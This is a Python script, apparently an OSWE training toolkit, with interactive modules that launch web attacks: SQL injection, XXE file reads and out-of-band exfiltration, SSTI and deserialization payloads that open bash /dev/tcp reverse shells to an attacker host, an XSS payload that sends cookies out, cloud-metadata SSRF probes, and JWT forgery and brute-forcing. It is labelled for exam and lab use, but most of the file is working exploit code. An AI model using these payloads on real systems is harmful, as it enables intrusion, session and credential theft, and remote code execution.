#!/usr/bin/env python3
"""
OSWE (WEB-300) multi-vulnerability exploit toolkit.

Pick a vulnerability class and the script asks the target-specific
questions it needs (endpoint, parameter, technique...) and walks you
through that class's typical white-box exploitation flow, with TODO
markers where target-specific gadget/payload work is still needed.
Built for guided exploit development during the exam/labs, not for
unattended scanning.

Modules: sqli, xxe, idor, authbypass, ssti, deser, ssrf,
         protopollution, jwt, xss2rce, patchdiff

Usage:
    python3 oswe_toolkit.py --list
    python3 oswe_toolkit.py -t http://target -m sqli
    python3 oswe_toolkit.py -t http://target -lh 10.10.14.1 -lp 4444 -v
    python3 oswe_toolkit.py --proxy http://127.0.0.1:8080 -m jwt
    python3 oswe_toolkit.py -m patchdiff
"""

import argparse
import base64
import difflib
import hashlib
import hmac
import json
import os
import pickle
import re
import textwrap
import time
import uuid

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Color:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    RESET = "\033[0m"


def log_info(msg):
    print(f"{Color.BLUE}[*]{Color.RESET} {msg}")


def log_success(msg):
    print(f"{Color.GREEN}[+]{Color.RESET} {msg}")


def log_error(msg):
    print(f"{Color.RED}[-]{Color.RESET} {msg}")


def log_warn(msg):
    print(f"{Color.YELLOW}[!]{Color.RESET} {msg}")


def prompt_choice(title, options):
    print(f"\n{Color.YELLOW}{title}{Color.RESET}")
    for i, opt in enumerate(options, 1):
        print(f"  {i}) {opt}")
    while True:
        choice = input("> ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(options):
            return options[int(choice) - 1]
        print("Invalid choice, try again.")


def payload_marker():
    return uuid.uuid4().hex[:8]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


class HTTPClient:
    def __init__(self, target=None, proxy=None, verbose=False, insecure=True):
        self.target = target.rstrip("/") if target else None
        self.verbose = verbose

        self.session = requests.Session()
        self.session.verify = not insecure
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
        })

    def url(self, path):
        if path.startswith("http://") or path.startswith("https://"):
            return path
        return f"{self.target}{path}"

    def request(self, method, path, **kwargs):
        resp = self.session.request(method, self.url(path), **kwargs)

        if self.verbose:
            req = resp.request
            log_info(f"--> {req.method} {req.url}")
            if req.body:
                body = req.body
                if isinstance(body, bytes):
                    body = body.decode(errors="replace")
                print(f"    body: {body}")
            log_info(f"<-- {resp.status_code} ({len(resp.content)} bytes)")

        return resp

    def get_csrf_token(self, path, pattern):
        """pattern needs a single capture group, e.g. r'name="csrf" value="([a-f0-9]+)"'"""
        resp = self.request("GET", path)
        match = re.search(pattern, resp.text)
        if not match:
            log_error(f"Could not find CSRF token at {path}")
            return None
        token = match.group(1)
        log_success(f"Got CSRF token: {token}")
        return token

    def authenticate(self, login_path, data):
        resp = self.request("POST", login_path, data=data, allow_redirects=True)
        log_info(f"Login response: HTTP {resp.status_code}")
        return resp


class VulnModule:
    name = ""
    description = ""

    def requires_target(self):
        return True

    def run(self, client, args):
        raise NotImplementedError


# --------------------------------------------------------------------------
# SQL Injection
# --------------------------------------------------------------------------
class SQLInjectionModule(VulnModule):
    name = "sqli"
    description = "SQL Injection - error-based, boolean/time blind, second-order"

    def run(self, client, args):
        technique = prompt_choice("SQL injection technique", [
            "Error-based", "Boolean-based blind", "Time-based blind", "Second-order",
        ])
        path = input("Vulnerable endpoint path, e.g. /search.php: ").strip()
        param = input("Injectable parameter name: ").strip()
        method = (input("HTTP method [GET]: ").strip() or "GET").upper()

        if technique == "Error-based":
            self._error_based(client, method, path, param)
        elif technique == "Boolean-based blind":
            self._boolean_blind(client, method, path, param)
        elif technique == "Time-based blind":
            self._time_blind(client, method, path, param)
        else:
            self._second_order(client, method, path, param)

    def _send(self, client, method, path, param, value):
        if method == "GET":
            return client.request(method, path, params={param: value})
        return client.request(method, path, data={param: value})

    def _error_based(self, client, method, path, param):
        payloads = ["'", "''", '"', "' OR '1'='1", "' UNION SELECT NULL-- -"]
        error_strings = ["sql syntax", "mysql_fetch", "ora-", "odbc", "sqlite", "pg::", "syntax error"]
        for payload in payloads:
            resp = self._send(client, method, path, param, payload)
            hit = any(e in resp.text.lower() for e in error_strings)
            flag = f"{Color.RED}possible SQL error{Color.RESET}" if hit else "no error string matched"
            log_info(f"payload={payload!r} -> HTTP {resp.status_code}, {flag}")
        log_warn("TODO: once an error is confirmed, find the column count (ORDER BY N) "
                  "then build 'UNION SELECT' to extract data, e.g. -1 UNION SELECT user(),version(),3-- -")

    def _boolean_blind(self, client, method, path, param):
        true_resp = self._send(client, method, path, param, "' OR '1'='1")
        false_resp = self._send(client, method, path, param, "' OR '1'='2")
        log_info(f"TRUE  payload len={len(true_resp.content)}, status={true_resp.status_code}")
        log_info(f"FALSE payload len={len(false_resp.content)}, status={false_resp.status_code}")
        if len(true_resp.content) != len(false_resp.content):
            log_success("Response differs between TRUE/FALSE conditions - likely boolean-blind injectable")
        else:
            log_warn("No difference observed - try a different injection point/payload")
        log_warn("TODO: automate character-by-character extraction with SUBSTRING()/ASCII() comparisons")

    def _time_blind(self, client, method, path, param):
        baseline = self._send(client, method, path, param, "1")
        start = time.time()
        self._send(client, method, path, param, "' OR SLEEP(5)-- -")
        elapsed = time.time() - start
        log_info(f"Baseline request status={baseline.status_code}")
        log_info(f"SLEEP(5) payload took {elapsed:.2f}s")
        if elapsed >= 4.5:
            log_success("Response delayed as expected - likely time-blind injectable")
        else:
            log_warn("No delay observed - try other DBMS syntax (pg_sleep, WAITFOR DELAY)")
        log_warn("TODO: automate data extraction with conditional SLEEP() per character")

    def _second_order(self, client, method, path, param):
        log_info("Second-order SQLi: payload is stored now and triggers when *read back* elsewhere "
                  "(e.g. a profile field rendered into another query).")
        marker = "OSWE_" + payload_marker()
        payload = f"{marker}' OR '1'='1"
        resp = self._send(client, method, path, param, payload)
        log_success(f"Stored payload with marker {marker} (HTTP {resp.status_code})")
        log_warn("TODO: identify the page/feature that reads this value back into a second query, "
                  "then watch for the injection effect there")


# --------------------------------------------------------------------------
# XXE
# --------------------------------------------------------------------------
class XXEModule(VulnModule):
    name = "xxe"
    description = "XML External Entity injection - classic, OOB exfil, blind/error-based"

    def run(self, client, args):
        technique = prompt_choice("XXE technique", [
            "Classic in-band file read", "Out-of-band exfiltration", "Blind / error-based",
        ])
        path = input("Vulnerable XML endpoint path: ").strip()
        if technique == "Classic in-band file read":
            self._classic(client, path)
        elif technique == "Out-of-band exfiltration":
            self._oob(client, path, args)
        else:
            self._blind(client, path)

    def _classic(self, client, path):
        target_file = input("File to read [/etc/passwd]: ").strip() or "/etc/passwd"
        payload = (
            '<?xml version="1.0"?>\n'
            f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{target_file}">]>\n'
            '<root>&xxe;</root>'
        )
        resp = client.request("POST", path, data=payload, headers={"Content-Type": "application/xml"})
        log_info(f"HTTP {resp.status_code}, {len(resp.content)} bytes")
        print(resp.text[:2000])

    def _oob(self, client, path, args):
        lhost = args.lhost or input("Your IP to host the malicious DTD on: ").strip()
        log_info("Host this as external.dtd on your attack box (python3 -m http.server 80):")
        print(textwrap.dedent(f"""\
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://{lhost}/?x=%file;'>">
            %eval;
            %exfil;
        """))
        payload = (
            '<?xml version="1.0"?>\n'
            f'<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{lhost}/external.dtd"> %remote;]>\n'
            '<root>oob</root>'
        )
        log_info("Payload to send once the DTD is hosted:")
        print(payload)
        if input("Send it now? [y/N]: ").strip().lower() == "y":
            resp = client.request("POST", path, data=payload, headers={"Content-Type": "application/xml"})
            log_info(f"HTTP {resp.status_code}")

    def _blind(self, client, path):
        log_warn("Blind XXE: no entity is reflected in the response. Use a malformed external DTD "
                  "to trigger a parser error that leaks the file content:")
        print(textwrap.dedent("""\
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
            %eval;
            %error;
        """))
        log_warn("TODO: host this DTD, reference it from the target, and check the response/error log for the leaked path")


# --------------------------------------------------------------------------
# IDOR / Broken Access Control
# --------------------------------------------------------------------------
class IDORModule(VulnModule):
    name = "idor"
    description = "Insecure Direct Object Reference / broken access control - ID enumeration & response diffing"

    def run(self, client, args):
        path_template = input("URL path template with {id} placeholder, e.g. /api/orders/{id}: ").strip()
        id_start = int(input("Start ID [1]: ").strip() or "1")
        id_end = int(input("End ID [20]: ").strip() or "20")
        cookie_a = input("Cookie/header for the low-priv user (blank = current session): ").strip()
        headers = {"Cookie": cookie_a} if cookie_a else None

        for i in range(id_start, id_end + 1):
            path = path_template.format(id=i)
            resp = client.request("GET", path, headers=headers)
            log_info(f"id={i} -> HTTP {resp.status_code}, {len(resp.content)} bytes")
        log_warn("TODO: compare object ownership in each response against the authenticated user "
                  "to confirm objects belonging to other users are accessible")


# --------------------------------------------------------------------------
# Authentication / authorization logic flaws
# --------------------------------------------------------------------------
class AuthBypassModule(VulnModule):
    name = "authbypass"
    description = "Auth/authz logic flaws - PHP type juggling, magic hashes, SQLi auth bypass"

    MAGIC_HASHES = [
        "240610708",  # md5 -> 0e462097431906509019562988736854
        "QNKCDZO",    # md5 -> 0e830400451993494058024219903391
    ]

    def run(self, client, args):
        technique = prompt_choice("Auth bypass technique", [
            "PHP loose-comparison type juggling", "PHP magic hash (password == hash)",
            "SQL injection in login", "Logic flaw checklist",
        ])

        if technique == "Logic flaw checklist":
            self._checklist()
            return

        login_path = input("Login endpoint path: ").strip()
        user_field = input("Username field name [username]: ").strip() or "username"
        pass_field = input("Password field name [password]: ").strip() or "password"
        username = input("Username to target [admin]: ").strip() or "admin"

        if technique == "PHP loose-comparison type juggling":
            self._type_juggling(client, login_path, user_field, pass_field, username)
        elif technique == "PHP magic hash (password == hash)":
            self._magic_hash(client, login_path, user_field, pass_field, username)
        else:
            self._sqli_login(client, login_path, user_field, pass_field, username)

    def _type_juggling(self, client, login_path, user_field, pass_field, username):
        log_info("PHP's `==` coerces types loosely - try array/bool/int coercion on the password field")
        attempts = [
            {pass_field: "0"},
            {pass_field + "[]": ""},
            {pass_field: "true"},
        ]
        for data in attempts:
            payload = {user_field: username, **data}
            resp = client.request("POST", login_path, data=payload, allow_redirects=False)
            log_info(f"payload={data} -> HTTP {resp.status_code}")
        log_warn("TODO: confirm bypass via redirect location / session cookie / page content on success")

    def _magic_hash(self, client, login_path, user_field, pass_field, username):
        log_info("Magic hashes are strings whose md5() starts with '0e' + only digits, which PHP's loose "
                  "'==' reads as scientific notation 0 - matching another '0e...' digit-only hash.")
        for mh in self.MAGIC_HASHES:
            resp = client.request("POST", login_path, data={user_field: username, pass_field: mh}, allow_redirects=False)
            log_info(f"magic hash={mh!r} -> HTTP {resp.status_code}")
        log_warn("TODO: only works if the app compares with `==`/`!=` instead of `===`/hash_equals(), "
                  "and the stored hash is also a digit-only '0e...' hash")

    def _sqli_login(self, client, login_path, user_field, pass_field, username):
        for p in ["' OR '1'='1'-- -", "' OR 1=1#", "admin'-- -"]:
            resp = client.request("POST", login_path, data={user_field: username, pass_field: p}, allow_redirects=False)
            log_info(f"password payload={p!r} -> HTTP {resp.status_code}")
        log_warn("TODO: also try injecting the username field, and check for differing redirect/session behavior")

    def _checklist(self):
        for item in [
            "Can the password reset token be predicted/brute-forced (sequential, timestamp-based, weak RNG)?",
            "Does changing a hidden field (role, isAdmin, userId) in a request alter privileges?",
            "Does the API enforce the same auth checks as the UI (direct API calls bypassing UI checks)?",
            "Is there a multi-step flow (MFA, password reset) where a later step can be called directly, skipping earlier checks?",
            "Does the app trust client-supplied identifiers (X-User-Id, JWT claims) without re-validating server-side?",
        ]:
            print(f"  [ ] {item}")


# --------------------------------------------------------------------------
# Server-Side Template Injection
# --------------------------------------------------------------------------
class SSTIModule(VulnModule):
    name = "ssti"
    description = "Server-Side Template Injection - detection across engines + RCE for Jinja2/Twig/FreeMarker"

    DETECTION_PAYLOADS = {
        "Generic math": "${{7*7}}",
        "Jinja2 / Twig": "{{7*7}}",
        "FreeMarker": "${7*7}",
        "Velocity": "#set($x=7*7)$x",
        "Smarty": "{$smarty.version}",
        "ERB (Ruby)": "<%= 7*7 %>",
    }

    def run(self, client, args):
        path = input("Endpoint where input is reflected into a template: ").strip()
        param = input("Parameter name: ").strip()
        method = (input("HTTP method [GET]: ").strip() or "GET").upper()

        log_info("Sending detection payloads (look for '49' reflected in the response)...")
        for engine, payload in self.DETECTION_PAYLOADS.items():
            resp = self._send(client, method, path, param, payload)
            hit = "49" in resp.text
            flag = f"{Color.GREEN}49 reflected!{Color.RESET}" if hit else "no match"
            log_info(f"{engine:14s} payload={payload!r:20s} -> {flag}")

        if input("\nProceed to RCE payload for a confirmed engine? [y/N]: ").strip().lower() == "y":
            engine = prompt_choice("Confirmed engine", ["Jinja2 (Python)", "Twig (PHP)", "FreeMarker (Java)"])
            self._rce(client, path, param, method, engine, args)

    def _send(self, client, method, path, param, value):
        if method == "GET":
            return client.request("GET", path, params={param: value})
        return client.request("POST", path, data={param: value})

    def _rce(self, client, path, param, method, engine, args):
        lhost = args.lhost or input("LHOST for callback: ").strip()
        lport = args.lport or input("LPORT for callback: ").strip()
        shell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

        if engine.startswith("Jinja2"):
            payload = (
                "{{ self.__init__.__globals__.__builtins__.__import__('os')"
                f".popen('{shell}').read() }}}}"
            )
        elif engine.startswith("Twig"):
            payload = f'{{{{["{shell}"]|filter("system")}}}}'
        else:
            payload = (
                '<#assign ex="freemarker.template.utility.Execute"?new()>'
                f'${{ex("{shell}")}}'
            )

        log_warn(f"Start a listener first: nc -nlvp {lport}")
        log_info(f"Payload:\n{payload}")
        self._send(client, method, path, param, payload)


# --------------------------------------------------------------------------
# Insecure Deserialization
# --------------------------------------------------------------------------
class DeserializationModule(VulnModule):
    name = "deser"
    description = "Insecure deserialization - PHP object injection, Python pickle, Java/.NET gadget chains"

    def run(self, client, args):
        lang = prompt_choice("Deserialization target", [
            "PHP object injection", "Python pickle", "Java (ysoserial)", ".NET ViewState (ysoserial.net)",
        ])
        if lang == "PHP object injection":
            self._php(client)
        elif lang == "Python pickle":
            self._pickle(client, args)
        elif lang == "Java (ysoserial)":
            self._java(args)
        else:
            self._dotnet()

    def _php(self, client):
        log_info("Requires a gadget class with __wakeup/__destruct reachable in the app's own source.")
        class_name = input("Vulnerable class name (from source review): ").strip()
        prop = input("Property used in the sink (e.g. file path, command): ").strip()
        value = input("Value to inject into that property: ").strip()
        serialized = f'O:{len(class_name)}:"{class_name}":1:{{s:{len(prop)}:"{prop}";s:{len(value)}:"{value}";}}'
        log_success(f"Serialized payload:\n{serialized}")

        path = input("Endpoint that unserializes attacker input (blank to skip sending): ").strip()
        if path:
            param = input("Parameter name [data]: ").strip() or "data"
            resp = client.request("POST", path, data={param: serialized})
            log_info(f"HTTP {resp.status_code}")

    def _pickle(self, client, args):
        lhost = args.lhost or input("LHOST for callback: ").strip()
        lport = args.lport or input("LPORT for callback: ").strip()
        shell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

        class Gadget:
            def __reduce__(self):
                return (os.system, (shell,))

        encoded = base64.b64encode(pickle.dumps(Gadget())).decode()
        log_warn(f"Start a listener first: nc -nlvp {lport}")
        log_success(f"Base64 pickle payload:\n{encoded}")

        path = input("Endpoint that unpickles attacker input (blank to skip sending): ").strip()
        if path:
            param = input("Parameter name [data]: ").strip() or "data"
            resp = client.request("POST", path, data={param: encoded})
            log_info(f"HTTP {resp.status_code}")

    def _java(self, args):
        lhost = args.lhost or input("LHOST for callback: ").strip()
        lport = args.lport or input("LPORT for callback: ").strip()
        cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        log_info("Generate the gadget chain locally with ysoserial (not bundled here):")
        print(f'  java -jar ysoserial.jar CommonsCollections6 "{cmd}" > payload.bin')
        log_warn("Pick the gadget chain (CommonsCollections5/6/7, Spring1/2, ...) matching the libraries "
                  "on the classpath, identified during source review.")

    def _dotnet(self):
        log_info("Generate the ViewState payload locally with ysoserial.net (not bundled here):")
        print('  ysoserial.net -p ViewState -g TextFormattingRunProperties -c "<command>" '
              '--validationalg="SHA1" --validationkey="<key>" --generator="<generator>" --viewstateuserkey="<key>"')
        log_warn("Validation key/algorithm/generator usually come from a leaked machineKey in web.config, "
                  "or a deserialization oracle (e.g. brute-forcing __VIEWSTATEGENERATOR).")


# --------------------------------------------------------------------------
# SSRF
# --------------------------------------------------------------------------
class SSRFModule(VulnModule):
    name = "ssrf"
    description = "Server-Side Request Forgery - internal services & cloud metadata probing"

    INTERNAL_TARGETS = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",              # AWS
        "http://169.254.169.254/metadata/v1/",                    # DigitalOcean
        "http://metadata.google.internal/computeMetadata/v1/",    # GCP (needs Metadata-Flavor header)
    ]

    def run(self, client, args):
        path = input("Vulnerable endpoint path: ").strip()
        param = input("Parameter that takes a URL: ").strip()
        method = (input("HTTP method [GET]: ").strip() or "GET").upper()
        custom = input("Extra internal URL to test (blank to skip): ").strip()

        targets = list(self.INTERNAL_TARGETS)
        if custom:
            targets.append(custom)

        for target_url in targets:
            if method == "GET":
                resp = client.request("GET", path, params={param: target_url})
            else:
                resp = client.request("POST", path, data={param: target_url})
            log_info(f"{target_url:55s} -> HTTP {resp.status_code}, {len(resp.content)} bytes")
        log_warn("TODO: for blind SSRF, point the param at your own server and watch for an incoming "
                  "callback instead of relying on the response body")


# --------------------------------------------------------------------------
# Prototype Pollution
# --------------------------------------------------------------------------
class PrototypePollutionModule(VulnModule):
    name = "protopollution"
    description = "JavaScript prototype pollution via merge/clone of attacker-controlled JSON"

    def run(self, client, args):
        path = input("Endpoint accepting JSON that gets merged/cloned server-side: ").strip()
        probe_key = input("Property to verify pollution with [polluted]: ").strip() or "polluted"
        payload = {"__proto__": {probe_key: "yes"}}
        resp = client.request("POST", path, json=payload, headers={"Content-Type": "application/json"})
        log_info(f"HTTP {resp.status_code}")
        log_warn(f"TODO: check elsewhere whether Object.prototype.{probe_key} now leaks through "
                  "(e.g. a different endpoint reflecting it), then look for a gadget that turns the "
                  "pollution into RCE (e.g. polluting a template engine option or a child_process flag)")


# --------------------------------------------------------------------------
# JWT attacks
# --------------------------------------------------------------------------
class JWTModule(VulnModule):
    name = "jwt"
    description = "JWT attacks - alg=none, RS256->HS256 key confusion, kid injection, weak secret brute force"

    def requires_target(self):
        return False

    def run(self, client, args):
        technique = prompt_choice("JWT technique", [
            "alg=none", "RS256 -> HS256 key confusion", "kid header injection", "Weak secret brute force",
        ])
        token = input("Existing valid JWT to tamper with: ").strip()
        try:
            header_b64, payload_b64, sig_b64 = token.split(".")
        except ValueError:
            log_error("That doesn't look like a valid JWT (expected 3 dot-separated parts)")
            return

        header = json.loads(b64url_decode(header_b64))
        payload = json.loads(b64url_decode(payload_b64))
        log_info(f"header={header}")
        log_info(f"payload={payload}")

        if technique == "alg=none":
            self._none_alg(header, payload)
        elif technique == "RS256 -> HS256 key confusion":
            self._key_confusion(header, payload)
        elif technique == "kid header injection":
            self._kid_injection(header, payload)
        else:
            self._brute_force(header_b64, payload_b64, sig_b64)

    def _none_alg(self, header, payload):
        header = {**header, "alg": "none"}
        payload = {**payload, "role": "admin"}  # TODO: edit claims to escalate
        forged = f"{b64url_encode(json.dumps(header).encode())}.{b64url_encode(json.dumps(payload).encode())}."
        log_success(f"Forged token (no signature):\n{forged}")

    def _key_confusion(self, header, payload):
        pubkey_path = input("Path to the server's RS256 public key (PEM): ").strip()
        with open(pubkey_path, "rb") as f:
            key = f.read()
        header = {**header, "alg": "HS256"}
        payload = {**payload, "role": "admin"}  # TODO: edit claims to escalate
        signing_input = f"{b64url_encode(json.dumps(header).encode())}.{b64url_encode(json.dumps(payload).encode())}"
        sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
        log_success(f"Forged token (HS256 signed using the RS256 public key as secret):\n{signing_input}.{b64url_encode(sig)}")

    def _kid_injection(self, header, payload):
        log_info("If 'kid' is used to look up the key on disk/DB, try path traversal or SQLi in its value, "
                  "then sign with a secret you control (e.g. an empty/predictable resolved file).")
        kid_payload = input("Malicious kid value (e.g. ../../../../dev/null): ").strip()
        secret = input("Secret matching that kid's resolved key (e.g. empty string for /dev/null): ")
        header = {**header, "kid": kid_payload}
        payload = {**payload, "role": "admin"}
        signing_input = f"{b64url_encode(json.dumps(header).encode())}.{b64url_encode(json.dumps(payload).encode())}"
        sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
        log_success(f"Forged token:\n{signing_input}.{b64url_encode(sig)}")

    def _brute_force(self, header_b64, payload_b64, sig_b64):
        wordlist_path = input("Path to a secret wordlist: ").strip()
        signing_input = f"{header_b64}.{payload_b64}"
        target_sig = b64url_decode(sig_b64)
        try:
            with open(wordlist_path, errors="ignore") as f:
                for line in f:
                    secret = line.strip()
                    if not secret:
                        continue
                    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                    if sig == target_sig:
                        log_success(f"Secret found: {secret!r}")
                        return
        except FileNotFoundError:
            log_error(f"Wordlist not found: {wordlist_path}")
            return
        log_warn("Secret not found in wordlist")


# --------------------------------------------------------------------------
# XSS chained into RCE
# --------------------------------------------------------------------------
class XSSToRCEModule(VulnModule):
    name = "xss2rce"
    description = "XSS chained into RCE - Electron/CEF nodeIntegration apps, CSP bypass notes"

    def requires_target(self):
        return False

    def run(self, client, args):
        context = prompt_choice("Where does the XSS execute?", [
            "Electron app with nodeIntegration", "Browser admin panel (session/cookie theft)", "CSP-restricted page",
        ])
        if context.startswith("Electron"):
            self._electron(args)
        elif context.startswith("Browser"):
            self._cookie_theft()
        else:
            self._csp_notes()

    def _electron(self, args):
        lhost = args.lhost or input("LHOST for callback: ").strip()
        lport = args.lport or input("LPORT for callback: ").strip()
        payload = (
            "<script>require('child_process').exec("
            f"'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'"
            ");</script>"
        )
        log_warn(f"Only works if nodeIntegration is enabled and contextIsolation is disabled. "
                  f"Start a listener: nc -nlvp {lport}")
        log_success(f"Payload:\n{payload}")

    def _cookie_theft(self):
        lhost = input("Your IP/host to receive stolen cookies: ").strip()
        payload = (
            "<script>new Image().src='http://"
            f"{lhost}/c?'+encodeURIComponent(document.cookie);</script>"
        )
        log_info("Serve a listener for the exfil, e.g.: python3 -m http.server 80")
        log_success(f"Payload:\n{payload}")

    def _csp_notes(self):
        for item in [
            "Check for a JSONP/Angular/whitelisted CDN endpoint allowed by the CSP that can be abused as a gadget",
            "Look for 'unsafe-inline' or a missing 'object-src'/'base-uri' directive",
            "Check if the nonce/hash is reused or predictable across requests",
            "Look for DOM clobbering or dangling-markup injection that survives the CSP",
        ]:
            print(f"  [ ] {item}")


# --------------------------------------------------------------------------
# Patch diffing
# --------------------------------------------------------------------------
class PatchDiffModule(VulnModule):
    name = "patchdiff"
    description = "Patch diffing - diff two app source trees to spot the vulnerability a patch fixed"

    def requires_target(self):
        return False

    def run(self, client, args):
        old_dir = input("Path to OLD (vulnerable) source tree: ").strip()
        new_dir = input("Path to NEW (patched) source tree: ").strip()

        old_files = self._walk(old_dir)
        new_files = self._walk(new_dir)

        added = sorted(set(new_files) - set(old_files))
        removed = sorted(set(old_files) - set(new_files))
        common = sorted(set(old_files) & set(new_files))

        if added:
            log_info("Added files:")
            for f in added:
                print(f"  + {f}")
        if removed:
            log_info("Removed files:")
            for f in removed:
                print(f"  - {f}")

        log_info("Diffing modified files...")
        for rel in common:
            try:
                with open(old_files[rel], errors="ignore") as f:
                    old_lines = f.readlines()
                with open(new_files[rel], errors="ignore") as f:
                    new_lines = f.readlines()
            except OSError:
                continue
            if old_lines == new_lines:
                continue
            diff = list(difflib.unified_diff(old_lines, new_lines, fromfile=rel, tofile=rel, n=2))
            if diff:
                log_success(f"--- {rel} changed ---")
                print("".join(diff))

        log_warn("TODO: focus on files touching auth, input validation or serialization - "
                  "that's usually where the patched vulnerability lives")

    def _walk(self, base_dir):
        files = {}
        for root, _, names in os.walk(base_dir):
            for name in names:
                full = os.path.join(root, name)
                rel = os.path.relpath(full, base_dir)
                files[rel] = full
        return files


MODULES = [
    SQLInjectionModule(),
    XXEModule(),
    IDORModule(),
    AuthBypassModule(),
    SSTIModule(),
    DeserializationModule(),
    SSRFModule(),
    PrototypePollutionModule(),
    JWTModule(),
    XSSToRCEModule(),
    PatchDiffModule(),
]
MODULE_MAP = {m.name: m for m in MODULES}


def print_module_list():
    print(f"\n{Color.YELLOW}Available modules:{Color.RESET}")
    for m in MODULES:
        print(f"  {m.name:16s} {m.description}")


def interactive_menu():
    print(f"\n{Color.YELLOW}Select a vulnerability class:{Color.RESET}")
    for i, m in enumerate(MODULES, 1):
        print(f"  {i:2d}) {m.name:16s} {m.description}")
    while True:
        choice = input("> ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(MODULES):
            return MODULES[int(choice) - 1].name
        if choice in MODULE_MAP:
            return choice
        print("Invalid choice, try again.")


def parse_args():
    parser = argparse.ArgumentParser(description="OSWE (WEB-300) multi-vulnerability exploit toolkit")
    parser.add_argument("-t", "--target", help="Target base URL, e.g. http://10.10.10.10:8080")
    parser.add_argument("-m", "--module", choices=list(MODULE_MAP), help="Vulnerability module to run directly")
    parser.add_argument("--list", action="store_true", help="List available modules and exit")
    parser.add_argument("-lh", "--lhost", help="Local IP for reverse shell callbacks")
    parser.add_argument("-lp", "--lport", type=int, help="Local port for reverse shell callbacks")
    parser.add_argument("--proxy", help="Proxy all requests through e.g. Burp: http://127.0.0.1:8080")
    parser.add_argument("--secure", action="store_true", help="Verify TLS certificates (default: disabled)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print raw requests/responses")
    return parser.parse_args()


def main():
    args = parse_args()

    if args.list:
        print_module_list()
        return

    module_name = args.module or interactive_menu()
    module = MODULE_MAP[module_name]

    if module.requires_target() and not args.target:
        args.target = input("Target base URL: ").strip()

    client = HTTPClient(
        target=args.target,
        proxy=args.proxy,
        verbose=args.verbose,
        insecure=not args.secure,
    )

    log_info(f"Running module: {module.name} - {module.description}")
    module.run(client, args)


if __name__ == "__main__":
    main()
